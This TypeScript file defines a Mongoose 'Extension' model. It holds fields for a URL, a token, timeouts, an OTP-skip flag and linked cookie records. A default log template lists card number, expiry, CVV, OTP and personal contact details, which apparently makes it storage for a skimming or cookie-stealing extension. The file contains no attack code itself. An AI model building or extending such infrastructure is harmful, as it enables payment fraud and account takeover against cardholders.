import { Schema, Document, model, Model } from "mongoose";
import { Cookie, ICookieDocument } from "./cookies.model";
interface IExtension {
  name?: string,
  url?: string,
  token?: string,
  timeout?: number,
  timeout2?: number,
  skipOTP?: boolean,
  logMessage?: string,
  createdAt?: Date,
  updatedAt?: Date,
  Cookies?: ICookieDocument[],
}
interface IExtensionDocument extends Document, IExtension {

}
interface IExtensionModel extends Model<IExtensionDocument> {

}
const schema = new Schema<IExtension>({
  name: {
    type: String,
    required: true
  },
  url: {
    type: String,
    required: true
  },
  token: {
    type: String,
    required: true,
    unique: true
  },
  timeout: {
    type: Number,
  },
  timeout2: {
    type: Number,
  },
  skipOTP: {
    type: Boolean,
  },
  logMessage: {
    type: String,
    default: 'cardNumber, expiredDate, cvv, otp, firstName, lastName, email, phone, street, state, zipcode , country',
  },
  Cookies: [{
    type: Schema.Types.ObjectId,
    ref: "Cookie"
  }]
}, {
  timestamps: true,
  strict: false,
});
const Extension = model<IExtension, IExtensionModel>("Extension", schema);
export {
  Extension,
  IExtensionDocument,
  IExtensionModel,
  IExtension
}
export default Extension;